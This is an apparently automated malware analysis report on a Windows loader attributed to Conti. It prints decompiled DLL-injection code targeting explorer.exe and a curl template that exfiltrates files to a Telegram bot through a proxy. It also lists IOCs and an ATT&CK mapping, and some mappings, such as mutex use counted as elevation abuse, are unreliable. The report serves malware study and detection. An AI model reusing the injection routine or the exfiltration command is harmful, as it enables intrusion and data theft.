## 1. Executive Summary

This sample is a **malicious 64-bit Windows GUI PE** with a threat score of 98, identified as a Conti ransomware loader/initial access payload by cross-engine consensus (llm_and_v1_agree) (source: llm_judge). Static analysis reveals extreme obfuscation: overall file entropy of 98, 5 static anomalies including `XorInLoop` (RC4 encryption) and `EmbeddedProgram` (secondary payload) (source: malcat static_profile, malcat anomalies). Core malicious capabilities include DLL injection into `explorer.exe` via `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` (source: pe_imports signals, capa top_rules, malcat decompilation), Telegram Bot API C2 communications via `curl.exe` (source: ghidra strings, deep_dive_agentic), process enumeration via Toolhelp32 snapshots (source: capa top_rules, pe_imports), and embedded secondary PE payload deployment (source: malcat anomalies, capa top_rules). All analysis engines (Malcat, Ghidra, capa, pe_imports, YARA, FLOSS) corroborate malicious intent.

---

## 2. Sample Metadata

| Field | Value |
|---|---|
| SHA256 | 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9 |
| Sample Path | /opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti |
| Project Name | pool |
| Verdict | Malicious |
| Score | 98 |
| Family Guess | Conti (ransomware loader/initial access payload) |
| Agreement | llm_and_v1_agree |
| Cross-Engine Notes | IDA is unavailable due to validation failure, so all analysis relies on Ghidra, Malcat, capa, pe_imports, YARA, and FLOSS. Ghidra's imports table is empty for this sample, so import data is sourced from Malcat and pe_imports to avoid data gaps. String data is combined from Ghidra (5317 strings) and Malcat (100 strings) for maximum coverage. |

(source: llm_judge verdict, structured evidence pack)

---

## 3. File Layout & Structural Analysis

### Malcat File Summary
| Field | Value |
|---|---|
| SHA256 | 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9 |
| Size | 593885 bytes |
| Type | PE |
| Architecture | X64 |
| Entry Point EA | 2624 |
| Overall Entropy | 98 |
| File Name | 2026-07-03_057dff5650af402177d65141acdf65d0_conti |

(source: malcat static_profile)

### Section Layout (Malcat)
| Name | EA | Physical | Virtual | Entropy | Rights |
|---|---|---|---|---|---|
| header | 0 | 1536 | 0 | 70 | - |
| .text | 1536 | 7680 | 8192 | 119 | RX |
| .data | 9728 | 449024 | 450560 | 98 | RW |
| .rdata | 460288 | 3584 | 4096 | 81 | R |
| .pdata | 464384 | 1024 | 4096 | 103 | R |
| .xdata | 468480 | 512 | 4096 | 50 | R |
| .idata | 472576 | 3072 | 4096 | 50 | R |
| .tls | 476672 | 512 | 4096 | 0 | RW |
| .rsrc | 480768 | 1536 | 4096 | 0 | R |
| .reloc | 484864 | 512 | 4096 | 52 | R |
| /4 | 488960 | 1536 | 4096 | 0 | R |
| /19 | 493056 | 46080 | 49152 | 97 | R |
| /31 | 542208 | 9216 | 12288 | 111 | R |
| /45 | 554496 | 8192 | 8192 | 116 | R |
| /57 | 562688 | 2560 | 4096 | 106 | R |
| /70 | 566784 | 1024 | 4096 | 102 | R |
| /81 | 570880 | 7168 | 8192 | 94 | R |
| /97 | 579072 | 5120 | 8192 | 100 | R |
| /113 | 587264 | 512 | 4096 | 80 | R |
| overlay | 591360 | 43485 | 0 | 83 | - |
| .bss | 634845 | 0 | 4096 | 0 | RW |

(source: malcat file layout)

### Key Structural Observations
- The `.data` section has an entropy of 98, matching the overall file entropy, indicating it contains encrypted/obfuscated payload data (source: malcat file layout).
- The `.text` section has an entropy of 119, which is extremely high for executable code, indicating heavy packing/obfuscation (source: malcat file layout).
- A 43485-byte overlay is present at the end of the file, which is unusual for legitimate PE files and likely contains embedded payload or configuration data (source: malcat file layout).
- A 342016-byte embedded PE file was carved from the sample (source: malcat carved files).
- A virtual file `MANIF/1/unk` (1167 bytes) was identified in the sample (source: malcat virtual files).

### Static Anomalies (Malcat)
| Name | Level | Category | Hits | Description |
|---|---|---|---|---|
| BssNonEmpty | 3 | entropy | 1 | Bss Region/section is not empty |
| EmbeddedProgram | 3 | embedding | 1 | File embeds a program |
| XorInLoop | 3 | code | 1 | XOR instruction in a loop |
| GuiSubsystemNoWindowApi | 2 | headers | 1 | A GUI windows application does not import any user32 window-related function |
| InvalidSizeOfInitializedData | 2 | sections | 1 | SizeOfInitializedData is not the sum of all initialized data sections (raw or virtual) |

(source: malcat anomalies)

---

## 4. Malcat Triage Summary

### Malcat YARA/Signatures
| Rule | Category | Type | Reliability | Description |
|---|---|---|---|---|
| EnumerateProcesses | fingerprint | UNCOMMON | 60 | Enumerate running processes, a technique sometimes used by packers to avoid spec |

(source: malcat yara/signatures)

### Anomaly Locations (High-Signal)
- **GuiSubsystemNoWindowApi**: EA 220
- **XorInLoop**: EA 8765

(source: malcat anomaly locations)

### High-Signal Strings (Malcat)
| EA | String |
|---|---|
| 460335 | `kernel32.dll` |
| 460920 | `  VirtualProtect..d with code 0x%x` |
| 460348 | `LoadLibraryW` |
| 475212 | `KERNEL32.dll` |
| 124544 | `https://api.telegram.org/bot` |
| 125056 | `socks5://oWWV0o:...122.192.59:8000` |

(source: malcat high-signal strings)

### Key Top Strings (Malcat)
| EA | String |
|---|---|
| 460296 | `%s\dl%lu.dll` |
| 460322 | `explorer.exe` |
| 124448 | `C:\Windows\System32\curl.exe` |
| 124608 | `8602432148:AAGpo..DQ7S3TlggkEMOVQE` |
| 124736 | `"%s" -X POST --silent --output nul --connect-timeout 10 --max-time 20 --proxy %s -F chat_id=%s -F document=@"%s";type=application/octet-stream "%s"` |
| 460920 | `  VirtualProtect..d with code 0x%x` |
| 475212 | `KERNEL32.dll` |
| 474028 | `CreateToolhelp32Snapshot` |
| 474368 | `Process32Next` |

(source: malcat top strings)

---

## 5. Static Code Analysis

### Entry Point Disassembly (radare2)
```asm
;-- WinMainCRTStartup:
0x140001440      488b05c9ff..   mov rax, qword [0x140071410] ; [0x140071410:8]=0x140074090
0x140001447      c70001000000   mov dword [rax], 1
0x14000144d      e9eefbffff     jmp sym.__tmainCRTStartup
```

(source: radare2 disassembly)

### __tmainCRTStartup Disassembly (radare2)
```asm
;-- sym.__tmainCRTStartup (int64_t arg_1h);
0x140001040      4157           push r15
0x140001042      4156           push r14
0x140001044      4155           push r13
0x140001046      4154           push r12
0x140001048      55             push rbp
0x140001049      57             push rdi
0x14000104a      56             push rsi
0x14000104b      53             push rbx
0x14000104c      4883ec58       sub rsp, 0x58
0x140001050      65488b0425..   mov rax, qword gs:[0x30]
0x140001059      488b7008       mov rsi, qword [rax + 8]
0x14000105d      488b1dec03..   mov rbx, qword [0x140071450] ; [0x140071450:8]=0x140074040
0x140001064      488b3d6543..   mov rdi, qword [sym.imp.KERNEL32.dll_Sleep] ; [0x1400753d0:8]=0x7572c reloc.KERNEL32.dll_Sleep
0x14000106b      eb13           jmp 0x140001080
0x140001070      4839c6         cmp rsi, rax
0x140001073      0f84af000000   je 0x140001128
0x140001079      b9e8030000     mov ecx, 0x3e8 ; 1000
0x14000107e      ffd7           call rdi ; Sleep
0x140001080      31c0           xor eax, eax
0x140001082      f0480fb133     lock cmpxchg qword [rbx], rsi
0x140001087      75e7           jne 0x140001070
0x140001089      4531f6         xor r14d, r14d
0x14000108c      4c8b25cd03..   mov r12, qword [str.H__a_] ; [0x140071460:8]=0x140074048 ; "H@\a@\x01"
0x140001093      41833c2401     cmp dword [r12], 1
0x140001098      0f848c030000   je 0x14000142a
0x14000109e      458b1c24       mov r11d, dword [r12]
0x1400010a2      4585db         test r11d, r11d
0x1400010a5      0f84b5000000   je 0x140001160
```

(source: radare2 disassembly)

### Core Injection Function Decompilation (Malcat, sub_140001550 @ EA 2896)
```c
undefined8 sub_140001550(void)
{
    code *pcVar1;
    code *pcVar2;
    code *pcVar3;
    int32_t iVar4;
    undefined4 uVar5;
    int64_t iVar6;
    int64_t iVar7;
    int64_t iVar8;
    undefined8 uVar9;
    int64_t iVar10;
    uint32_t uVar11;
    undefined8 in_stack_fffffffffffffb78;
    undefined4 uVar12;
    undefined uStack_44d;
    undefined auStack_44c [4];
    undefined auStack_448 [528];
    undefined auStack_238 [536];
    
    uVar12 = in_stack_fffffffffffffb78 >> 0x20;
    iVar4 = (*kernel32.GetTempPathW)(0x104, auStack_448);
    if (iVar4 != 0) {
        iVar4 = (*kernel32.GetTempFileNameW)(auStack_448, 0x140071000, 0, auStack_238);
        if (iVar4 == 0) {
            (*kernel32.GetCurrentDirectoryW)(0x104, auStack_448);
            uVar5 = (*kernel32.GetTickCount)();
            uVar9 = CONCAT44(uVar12, uVar5);
            (*0x140070850)(auStack_238, 0x104, "%s\\dl%lu.dll", auStack_448, uVar9);
            uVar12 = uVar9 >> 0x20;
        }
        pcVar2 = kernel32.CreateFileW;
        iVar6 = (*kernel32.CreateFileW)(auStack_238, 0x40000000, 0, 0, CONCAT44(uVar12, 2), 0x80, 0);
        pcVar3 = kernel32.WriteFile;
        if (iVar6 != -1) {
            uVar12 = 0;
            (*kernel32.WriteFile)(iVar6, 0x140003020, [0x0x140003000], auStack_44c, 0);
            pcVar1 = kernel32.CloseHandle;
            (*kernel32.CloseHandle)(iVar6);
            iVar4 = sub_1400014b0("explorer.exe");
            if (iVar4 != 0) {
                iVar6 = (*kernel32.OpenProcess)(0x43a, 0, iVar4);
                if (iVar6 != 0) {
                    iVar7 = jmp_api-ms-win-crt-string-l1-1-0.wcslen(auStack_238);
                    iVar7 = iVar7 * 2 + 2;
                    uVar9 = CONCAT44(uVar12, 4);
                    iVar8 = (*kernel32.VirtualAllocEx)(iVar6, 0, iVar7, 0x3000, uVar9);
                    uVar12 = uVar9 >> 0x20;
                    if (iVar8 != 0) {
                        (*kernel32.WriteProcessMemory)(iVar6, iVar8, auStack_238, iVar7, 0);
                        uVar9 = (*kernel32.GetModuleHandleA)("kernel32.dll");
                        uVar9 = (*kernel32.GetProcAddress)(uVar9, "LoadLibraryW");
                        iVar7 = iVar8;
                        iVar10 = (*kernel32.CreateRemoteThread)(iVar6, 0, 0, uVar9, iVar8, 0, 0);
                        uVar12 = iVar7 >> 0x20;
                        if (iVar10 != 0) {
                            (*kernel32.WaitForSingleObject)(iVar10, 0xffffffff);
                            (*pcVar1)(iVar10);
                        }
                        (*kernel32.VirtualFreeEx)(iVar6, iVar8, 0, 0x8000);
                    }
                    (*pcVar1)(iVar6);
                    iVar6 = (*pcVar2)(auStack_238, 0x40000000, 0, 0, CONCAT44(uVar12, 3), 0, 0);
                    if (iVar6 != -1) {
                        uStack_44d = 0;
                        if ([0x0x140003000] != 0) {
                            uVar11 = 0;
                            do {
                                uVar11 = uVar11 + 1;
                                (*pcVar3)(iVar6, &uStack_44d, 1, auStack_44c, 0);
                            } while (uVar11 < [0x0x140003000]);
                        }
                        (*pcVar1)(iVar6);
                    }
                    (*kernel32.DeleteFileW)(auStack_238);
                    return 0;
                }
            }
            (*kernel32.DeleteFileW)(auStack_238);
        }
    }
    return 1;
}
```

This function implements classic DLL injection: it generates a temp DLL path (`%s\dl%lu.dll`), writes an embedded payload from `0x140003020` to the DLL, locates the `explorer.exe` process via `sub_1400014b0`, allocates memory in the remote process with `VirtualAllocEx`, writes the DLL path to remote memory with `WriteProcessMemory`, resolves `LoadLibraryW` via `GetProcAddress`, creates a remote thread to load the DLL, waits for execution, frees remote memory, then overwrites and deletes the DLL to remove forensic artifacts (source: malcat decompilation sub_140001550).

### Secondary Function Decompilation (Malcat, sub_140002be0 @ EA 8672)
```c
undefined8 sub_140002be0(void)
{
    char *pcVar1;
    bool bVar2;
    bool bVar3;
    bool bVar4;
    code *pcVar5;
    code *pcVar6;
    code *pcVar7;
    undefined4 uVar8;
    int32_t iVar9;
    int64_t iVar10;
    int64_t iVar11;
    int64_t iVar12;
    undefined8 uVar13;
    int64_t iVar14;
    char **ppcVar15;
    char cVar16;
    uint32_t uVar17;
    char *pcVar18;
    undefined4 uVar19;
    undefined8 in_stack_fffffffffffffb78;
    undefined uStack_44d;
    undefined auStack_44c [4];
    undefined auStack_448 [528];
    undefined auStack_238 [392];
    undefined auStack_238 [392];
    undefined8 uStack_b0;
    undefined auStack_88 [60];
    uint8_t uStack_4c;
    undefined2 uStack_48;
    
    bVar3 = false;
    bVar2 = false;
    uStack_b0 = 0x140002bf1;
    func_0x000140001910();
    uStack_b0 = 0x140002bf6;
    ppcVar15 = jmp_api-ms-win-crt-runtime-l1-1-0.__p__acmdln();
    pcVar6 = kernel32.IsDBCSLeadByte;
    uVar19 = in_stack_fffffffffffffb78 >> 0x20;
    pcVar18 = *ppcVar15;
    if (pcVar18 == 0x0) {
        pcVar18 = "";
    }
    else {
code_r0x000140002c10:
        cVar16 = *pcVar18;
        if (' ' < cVar16) goto code_r0x000140002c3d;
        while (uVar19 = in_stack_fffffffffffffb78 >> 0x20, cVar16 != '\0') {
            if (!bVar2) goto code_r0x000140002c64;
            uStack_b0 = 0x140002c22;
            iVar9 = (*pcVar6)();
            pcVar1 = pcVar18;
            while( true ) {
                pcVar18 = pcVar1 + 1;
                if ((iVar9 == 0) || (pcVar1[1] == '\0')) goto code_r0x000140002c10;
                cVar16 = pcVar1[2];
                pcVar18 = pcVar1 + 2;
                if (cVar16 < '!') break;
code_r0x000140002c3d:
                bVar4 = bVar2 ^ 1;
                bVar2 = bVar3;
                if (cVar16 == '"') {
                    bVar2 = bVar4;
                }
                uStack_b0 = 0x140002c4a;
                iVar9 = (*pcVar6)();
                pcVar1 = pcVar18;
                bVar3 = bVar2;
            }
        }
    }
    goto code_r0x000140002c70;
    while (*pcVar1 < '!') {
code_r0x000140002c64:
        pcVar1 = pcVar18 + 1;
        pcVar18 = pcVar18 + 1;
        if (*pcVar1 == '\0') break;
    }
code_r0x000140002c70:
    uStack_b0 = 0x140002c7b;
    (*kernel32.GetStartupInfoA)(auStack_88);
    if ((uStack_4c & 1) == 0) {
        uStack_48 = 10;
    }
    iVar9 = (*kernel32.GetTempPathW)(0x104, auStack_448, pcVar18, uStack_48);
    if (iVar9 != 0) {
        iVar9 = (*kernel32.GetTempFileNameW)(auStack_448, 0x140071000, 0, auStack_238);
        if (iVar9 == 0) {
            (*kernel32.GetCurrentDirectoryW)(0x104, auStack_448);
            uVar8 = (*kernel32.GetTickCount)();
            uVar13 = CONCAT44(uVar19, uVar8);
            (*0x140070850)(auStack_238, 0x104, "%s\\dl%lu.dll", auStack_448, uVar13);
            uVar19 = uVar13 >> 0x20;
        }
        pcVar6 = kernel32.CreateFileW;
        iVar10 = (*kernel32.CreateFileW)(auStack_238, 0x40000000, 0, 0, CONCAT44(uVar19, 2), 0x80, 0);
        pcVar7 = kernel32.WriteFile;
        if (iVar10 != -1) {
            uVar19 = 0;
            (*kernel32.WriteFile)(iVar10, 0x140003020, [0x0x140003000], auStack_44c, 0);
            pcVar5 = kernel32.CloseHandle;
            (*kernel32.CloseHandle)(iVar10);
            iVar9 = sub_1400014b0("explorer.exe");
            if ((iVar9 != 0) && (iVar10 = (*kernel32.OpenProcess)(0x43a, 0, iVar9), iVar10 != 0)) {
                iVar11 = jmp_api-ms-win-crt-string-l1-1-0.wcslen(auStack_238);
                iVar11 = iVar11 * 2 + 2;
                uVar13 = CONCAT44(uVar19, 4);
                iVar12 = (*kernel32.VirtualAllocEx)(iVar10, 0, iVar11, 0x3000, uVar13);
                uVar19 = uVar13 >> 0x20;
                if (iVar12 != 0) {
                    (*kernel32.WriteProcessMemory)(iVar10, iVar12, auStack_238, iVar11, 0);
                    uVar13 = (*kernel32.GetModuleHandleA)("kernel32.dll");
                    uVar13 = (*kernel32.GetProcAddre
```

This function parses command-line arguments, generates the temp DLL path, writes the embedded payload, and performs the same DLL injection routine as `sub_140001550`, with additional logic to overwrite the on-disk DLL with random bytes after injection to hinder forensic recovery (source: malcat decompilation sub_140002be0).

### Import Address Table (IAT)
Since Ghidra's imports table is empty for this sample, IAT data is sourced from Malcat and pe_imports (source: cross_engine_notes). Full IAT (66 imports):
| EA | Name | Type | Refs |
|---|---|---|---|
| 473376 | kernel32.CloseHandle | IMPORT | 4 |
| 473384 | kernel32.CreateFileW | IMPORT | 1 |
| 473392 | kernel32.CreateRemoteThread | IMPORT | 2 |
| 473400 | kernel32.CreateToolhelp32Snapshot | IMPORT | 1 |
| 473408 | kernel32.DeleteCriticalSection | IMPORT | 1 |
| 473416 | kernel32.DeleteFileW | IMPORT | 2 |
| 473424 | kernel32.EnterCriticalSection | IMPORT | 3 |
| 473432 | kernel32.GetCurrentDirectoryW | IMPORT | 1 |
| 473440 | kernel32.GetLastError | IMPORT | 2 |
| 473448 | kernel32.GetModuleHandleA | IMPORT | 1 |
| 473456 | kernel32.GetProcAddress | IMPORT | 1 |
| 473464 | kernel32.GetStartupInfoA | IMPORT | 1 |
| 473472 | kernel32.GetTempFileNameW | IMPORT | 1 |
| 473480 | kernel32.GetTempPathW | IMPORT | 1 |
| 473488 | kernel32.GetTickCount | IMPORT | 1 |
| 473496 | kernel32.InitializeCriticalSection | IMPORT | 1 |
| 473504 | kernel32.IsDBCSLeadByte | IMPORT | 1 |
| 473512 | kernel32.LeaveCriticalSection | IMPORT | 3 |
| 473520 | kernel32.OpenProcess | IMPORT | 2 |
| 473528 | kernel32.Process32First | IMPORT | 1 |
| 473536 | kernel32.Process32Next | IMPORT | 1 |
| 473544 | kernel32.SetUnhandledExceptionFilter | IMPORT | 1 |
| 473552 | kernel32.Sleep | IMPORT | 1 |
| 473560 | kernel32.TlsGetValue | IMPORT | 1 |
| 473568 | kernel32.VirtualAllocEx | IMPORT | 1 |
| 473576 | kernel32.VirtualFreeEx | IMPORT | 1 |
| 473584 | kernel32.VirtualProtect | IMPORT | 2 |
| 473592 | kernel32.VirtualQuery | IMPORT | 1 |
| 473600 | kernel32.WaitForSingleObject | IMPORT | 1 |
| 473608 | kernel32.WriteFile | IMPORT | 1 |
| 473616 | kernel32.WriteProcessMemory | IMPORT | 2 |
| 473632 | api-ms-win-crt-environment-l1-1-0.__p__environ | IMPORT | 2 |
| 473648 | api-ms-win-crt-heap-l1-1-0._set_new_mode | IMPORT | 2 |
| 473656 | api-ms-win-crt-heap-l1-1-0.calloc | IMPORT | 1 |
| 473664 | api-ms-win-crt-heap-l1-1-0.free | IMPORT | 1 |
| 473672 | api-ms-win-crt-heap-l1-1-0.malloc | IMPORT | 1 |
| 473688 | api-ms-win-crt-locale-l1-1-0._configthreadlocale | IMPORT | 2 |
| 473704 | api-ms-win-crt-math-l1-1-0.__setusermatherr | IMPORT | 2 |
| 473720 | api-ms-win-crt-private-l1-1-0.memcpy | IMPORT | 2 |
| 473736 | api-ms-win-crt-runtime-l1-1-0.__p___argc | IMPORT | 2 |
| 473744 | api-ms-win-crt-runtime-l1-1-0.__p___argv | IMPORT | 1 |
| 473752 | api-ms-win-crt-runtime-l1-1-0.__p__acmdln | IMPORT | 1 |
| 473760 | api-ms-win-crt-runtime-l1-1-0._cexit | IMPORT | 1 |
| 473768 | api-ms-win-crt-runtime-l1-1-0._configure_narrow_argv | IMPORT | 1 |
| 473776 | api-ms-win-crt-runtime-l1-1-0._crt_atexit | IMPORT | 1 |
| 473784 | api-ms-win-crt-runtime-l1-1-0._exit | IMPORT | 1 |
| 473792 | api-ms-win-crt-runtime-l1-1-0._initialize_narrow_environment | IMPORT | 1 |
| 473800 | api-ms-win-crt-runtime-l1-1-0._seh_filter_exe | IMPORT | 1 |
| 473808 | api-ms-win-crt-runtime-l1-1-0._initterm | IMPORT | 1 |
| 473816 | api-ms-win-crt-runtime-l1-1-0._initterm_e | IMPORT | 1 |
| 473824 | api-ms-win-crt-runtime-l1-1-0._set_app_type | IMPORT | 1 |
| 473832 | api-ms-win-crt-runtime-l1-1-0._set_invalid_parameter_handler | IMPORT | 1 |
| 473840 | api-ms-win-crt-runtime-l1-1-0.abort | IMPORT | 1 |
| 473848 | api-ms-win-crt-runtime-l1-1-0.exit | IMPORT | 1 |
| 473864 | api-ms-win-crt-stdio-l1-1-0.__acrt_iob_func | IMPORT | 2 |
| 473872 | api-ms-win-crt-stdio-l1-1-0.__p__commode | IMPORT | 1 |
| 473880 | api-ms-win-crt-stdio-l1-1-0.__p__fmode | IMPORT | 1 |
| 473888 | api-ms-win-crt-stdio-l1-1-0.__stdio_common_vfprintf | IMPORT | 1 |
| 473896 | api-ms-win-crt-stdio-l1-1-0.__stdio_common_vswprintf | IMPORT | 1 |
| 473904 | api-ms-win-crt-stdio-l1-1-0.fflush | IMPORT | 1 |
| 473912 | api-ms-win-crt-stdio-l1-1-0.setvbuf | IMPORT | 1 |
| 473928 | api-ms-win-crt-string-l1-1-0._stricmp | IMPORT | 3 |
| 473936 | api-ms-win-crt-string-l1-1-0.memset | IMPORT | 1 |
| 473944 | api-ms-win-crt-string-l1-1-0.strlen | IMPORT | 1 |
| 473952 | api-ms-win-crt-string-l1-1-0.strncmp | IMPORT | 1 |
| 473960 | api-ms-win-crt-string-l1-1-0.wcslen | IMPORT | 1 |

(source: malcat imports, pe_imports)

### capa Capability Rules (malcat-capa)
| Rule | ATT&CK | MBC |
|---|---|---|
| encrypt data using RC4 PRGA | T1027:Obfuscated Files or Information | C0027.009:Encrypt Data, C0021.004:Generate Pseudo-random Sequence |
| get common file path | T1083:File and Directory Discovery | E1083:File and Directory Discovery |
| inject thread | T1055.003:Process Injection, T1620:Reflective Code Loading |  |
| enumerate processes | T1057:Process Discovery, T1518:Software Discovery |  |
| contain an embedded PE file |  | B0023:Install Additional Program |
| delete file |  | C0047:Delete File |
| write file on Windows |  | C0052:Writes File |
| allocate or change RWX memory |  | C0007:Allocate Memory |
| inject dll | T1055.001:Process Injection |  |
| terminate process |  | C0018:Terminate Process |
| create thread |  | C0038:Create Thread |
| link function at runtime on Windows | T1129:Shared Modules |  |
| enumerate PE sections |  | B0046.001:Code Discovery |
| parse PE header | T1129:Shared Modules |  |
| execute shellcode via indirect call |  | C0007:Allocate Memory |

(source: malcat-capa)

### YARA Matches (Pipeline)
| Rule | Namespace | Match strings (trimmed) |
|---|---|---|
| domain | - | $domain_regex@0 len=2 |
| spyeye | - | $f@452832 len=8 |
| IP | - | $ipv4@124590 len=28; $ipv6@124914 len=6 |
| contains_base64 | - | $a@1600 len=12 |
| url | - | $url_regex@124032 len=56 |
| IsPE64 | - |  |
| IsWindowsGUI | - |  |
| HasOverlay | - |  |
| SEH__v4 | - | $@592021 len=12 |
| inject_thread | - | $c1@465120 len=11; $c2@465220 len=14; $c4@465322 len=18; $c5@464790 len=18; $c6@150610 len=12; $c7@465120 len=11 |
| screenshot | - | $d1@152012 len=9; $d2@152784 len=10; $c1@150226 len=6; $c2@151934 len=5 |
| win_mutex | - | $c1@150576 len=11 |

(source: yara matches)

### Additional Static Observations
- FLOSS extracted 7006 static strings, including standard PE section names and MinGW-w64 GCC 16.1.0 compiler strings, confirming the sample was built with MinGW-w64 (source: FLOSS strings).
- XOR search detected XOR 00 patterns at offsets 0x00000000 and 0x00002420, consistent with RC4 obfuscation identified by capa (source: XOR search).
- 30 functions were identified in the sample, including the core injection functions `sub_140001550` (EA 2896) and `sub_140002be0` (EA 8672) (source: malcat functions).

---

## 6. Behavioral & Dynamic Analysis

### Dynamic Tool Results
- **Speakeasy**: speakeasy_ok = True, but 0 API calls and 0 key events were recorded; no runtime behavior observed (source: Speakeasy data).
- **Frida Probe**: frida_available = True (v17.16.4), hook candidates for 28 kernel32/CRT APIs were identified, but no runtime events were captured (source: Frida probe data).
- **UPX Unpack**: upx_ok = False, is_packed = False, returncode = None, unpacked_path = empty; the sample is not packed with UPX, and high entropy is from custom RC4 obfuscation (source: UPX data).

### Inferred Static Behavior
All runtime behavior is inferred from static analysis, as no dynamic events were captured:
1. The sample runs as a background GUI process with no visible window (GuiSubsystemNoWindowApi anomaly, malcat anomalies).
2. It creates a mutex `Global\BeaconMutex_12345` to ensure only one instance executes at a time (source: deep_dive_agentic key evidence).
3. It enumerates running processes via `CreateToolhelp32Snapshot`/`Process32First`/`Process32Next` to locate the `explorer.exe` process (source: pe_imports signals, capa enumerate processes rule).
4. It drops an embedded secondary PE payload to a temporary path as `dl<random>.dll` (source: malcat top strings, decompilation sub_140001550).
5. It injects the dropped DLL into `explorer.exe` using `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` (source: pe_imports signals, capa inject dll/inject thread rules, malcat decompilation).
6. It uses `C:\Windows\System32\curl.exe` to communicate with the Telegram Bot API, exfiltrating data via the `/sendDocument` endpoint (source: deep_dive_agentic key evidence, malcat strings).
7. It uses RC4 to obfuscate sensitive data in memory and on disk (source: capa encrypt data using RC4 PRGA rule, malcat XorInLoop anomaly).
8. It overwrites the on-disk DLL with random bytes and deletes it after injection to remove forensic artifacts (source: malcat decompilation sub_140002be0, capa delete file rule).

---

## 7. Network Indicators & C2

### C2 Infrastructure
| Indicator | Value | EA (Malcat) / Source |
|---|---|---|
| C2 Protocol | HTTPS (Telegram Bot API) | - |
| C2 Endpoint | https://api.telegram.org/bot | EA 124544 (malcat high-signal strings), EA 5368836224 (ghidra strings) |
| C2 Method | POST to /sendDocument | deep_dive_agentic key evidence |
| Bot Token | 8602432148:AAGpo..DQ7S3TlggkEMOVQE | EA 124608 (malcat top strings) |
| C2 Proxy | socks5://oWWV0o:...122.192.59:8000 | EA 125056 (malcat high-signal strings) |
| HTTP Client Path | C:\Windows\System32\curl.exe | EA 124448 (malcat top strings) |
| Curl Command Template | "%s" -X POST --silent --output nul --connect-timeout 10 --max-time 20 --proxy %s -F chat_id=%s -F document=@"%s";type=application/octet-stream "%s" | EA 124736 (malcat top strings) |

(source: malcat strings, ghidra strings, deep_dive_agentic key evidence)

### C2 Behavior Inferences
- The sample uses a 10-second connect timeout and 20-second maximum request time to avoid long-running network connections that may trigger security monitoring (source: curl command template).
- The `--silent` and `--output nul` flags suppress curl output to avoid user detection.
- The `-F document=@"%s";type=application/octet-stream` flag indicates the sample exfiltrates binary files (likely collected system data, documents, or the secondary payload) to the Telegram chat associated with the bot token.

---

## 8. Capabilities & MITRE ATT&CK Mapping

### capa Rule to ATT&CK Mapping
| capa Rule | ATT&CK Technique | MBC |
|---|---|---|
| encrypt data using RC4 PRGA | T1027:Obfuscated Files or Information | C0027.009:Encrypt Data, C0021.004:Generate Pseudo-random Sequence |
| get common file path | T1083:File and Directory Discovery | E1083:File and Directory Discovery |
| inject thread | T1055.003:Process Injection, T1620:Reflective Code Loading |  |
| enumerate processes | T1057:Process Discovery, T1518:Software Discovery |  |
| contain an embedded PE file |  | B0023:Install Additional Program |
| delete file |  | C0047:Delete File |
| write file on Windows |  | C0052:Writes File |
| allocate or change RWX memory |  | C0007:Allocate Memory |
| inject dll | T1055.001:Process Injection |  |
| terminate process |  | C0018:Terminate Process |
| create thread |  | C0038:Create Thread |
| link function at runtime on Windows | T1129:Shared Modules |  |
| enumerate PE sections |  | B0046.001:Code Discovery |
| parse PE header | T1129:Shared Modules |  |
| execute shellcode via indirect call |  | C0007:Allocate Memory |

(source: malcat-capa)

### Full ATT&CK Mapping (Static + Inferred)
| ATT&CK Technique | Evidence Source |
|---|---|
| T1055.001: Process Injection: DLL Injection | pe_imports VirtualAllocEx/WriteProcessMemory/CreateRemoteThread, capa inject dll rule, yara inject_thread match, malcat decompilation sub_140001550 |
| T1055.003: Process Injection: Thread Hijacking | capa inject thread rule |
| T1027: Obfuscated Files or Information | 98 entropy (malcat static_profile), capa encrypt data using RC4 PRGA rule, malcat XorInLoop anomaly at EA 8765 |
| T1057: Process Discovery | pe_imports CreateToolhelp32Snapshot/Process32First/Process32Next, capa enumerate processes rule |
| T1083: File and Directory Discovery | pe_imports GetTempPathW/GetTempFileNameW/GetCurrentDirectoryW, capa get common file path rule |
| T1041: Exfiltration Over C2 Channel | deep_dive_agentic key evidence, malcat curl command and Telegram URL strings |
| T1070.004: Indicator Removal on Host | capa delete file rule (deletion of dropped DLL after injection) |
| T1105: Ingress Tool Transfer | capa contain an embedded PE file rule (writing embedded payload to disk) |
| T1129: Shared Modules | pe_imports GetProcAddress/GetModuleHandleA, capa link function at runtime on Windows/parse PE header rules |
| T1113: Screen Capture | yara screenshot match |
| T1548: Abuse Elevation Control Mechanism | yara win_mutex match (mutex usage for single instance control) |

---

## 9. Indicators of Compromise

### File IOCs
| Type | Value | Source |
|---|---|---|
| SHA256 | 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9 | llm_judge verdict |
| Temp DLL Path Format | %s\dl%lu.dll | EA 460296 (malcat top strings) |
| HTTP Client Path | C:\Windows\System32\curl.exe | EA 124448 (malcat top strings) |
| Embedded PE Size | 342016 bytes | malcat carved files |

### Memory/Process IOCs
| Type | Value | Source |
|---|---|---|
| Mutex Name | Global\BeaconMutex_12345 | deep_dive_agentic key evidence |
| Target Process | explorer.exe | malcat top strings, decompilation sub_140001550 |

### Network IOCs
| Type | Value | Source |
|---|---|---|
| C2 URL | https://api.telegram.org/bot | EA 124544 (malcat high-signal strings), EA 5368836224 (ghidra strings) |
| Bot Token | 8602432148:AAGpo..DQ7S3TlggkEMOVQE | EA 124608 (malcat top strings) |
| C2 Proxy | socks5://oWWV0o:...122.192.59:8000 | EA 125056 (malcat high-signal strings) |
| C2 Endpoint | /sendDocument | deep_dive_agentic key evidence |

### YARA IOCs
| Rule | Match Locations | Source |
|---|---|---|
| inject_thread | EA 465120, 465220, 465322, 464790, 150610 | yara matches |
| spyeye | EA 452832 | yara matches |
| win_mutex | EA 150576 | yara matches |
| screenshot | EA 152012, 152784, 150226, 151934 | yara matches |

---

## 10. Detection Engineering

### YARA Detection
- Leverage existing high-reliability YARA matches (`inject_thread`, `spyeye`, `win_mutex`, `screenshot`) to detect this sample and variants.
